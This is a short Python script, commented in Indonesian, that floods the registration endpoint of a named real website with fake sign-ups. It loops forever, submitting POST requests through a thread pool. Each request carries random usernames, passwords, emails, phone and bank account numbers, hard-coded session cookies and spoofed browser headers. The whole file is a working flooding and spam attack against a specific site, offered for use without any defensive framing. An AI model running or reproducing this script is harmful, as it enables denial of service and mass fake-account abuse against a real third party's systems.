import requests
import random
import string
from concurrent.futures import ThreadPoolExecutor

# Fungsi untuk menghasilkan random string
def generate_random_string(length):
    letters = string.ascii_letters
    return ''.join(random.choice(letters) for _ in range(length))

# Fungsi untuk menghasilkan random email
def generate_random_email():
    username = generate_random_string(50)
    domain = generate_random_string(50)
    return f"{username}@{domain}.com"

# Fungsi untuk menghasilkan random number
def generate_random_number(length):
    return ''.join(random.choice(string.digits) for _ in range(length))

# Fungsi untuk melakukan permintaan HTTP
def make_http_request():
    random_password = generate_random_string(100)

    cookies = {
    'chaport-64badb6587d008fca92fd44d': '8edd8340-a3a5-4abd-86bb-3b111e0b437e%2FYGF7Q4NuASw1zE3qA9mb9xKxZjy2uhoyQxbJVw',
    'PHPSESSID': 'tllqce9uahf3c176f6r0imi793',
    }


    headers = {
        'authority': 'upsberjaya.com',
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.9',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'origin': 'https://upsberjaya.com',
        'referer': 'https://upsberjaya.com/?content=register',
        'sec-ch-ua': '"Chromium";v="118", "Google Chrome";v="118", "Not=A?Brand";v="99"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36',
        'x-requested-with': 'XMLHttpRequest',
    }
    
    data = {
        'username': generate_random_string(10),
        'pass': random_password,
        'passcon': random_password,
        'email': generate_random_email(),
        'telpon': generate_random_number(12),
        'bank': 'BCA',
        'rek': generate_random_number(12),
        'nama': generate_random_string(12),
        'ref': 'pastigacor7',
        'task': 'register',
        'regdesktop': 'yJlL58l4xESFNCpbsEv5XgYChKeis6Ygr2+veatjvX0=',
    }

    # Lakukan permintaan POST
    response = requests.post('https://upsberjaya.com/new-webdata.php', cookies=cookies, headers=headers, data=data)

    # Output response
    print(response.text)

# Meminta input dari pengguna
with ThreadPoolExecutor(max_workers=None) as executor:
    while True:
        executor.submit(make_http_request)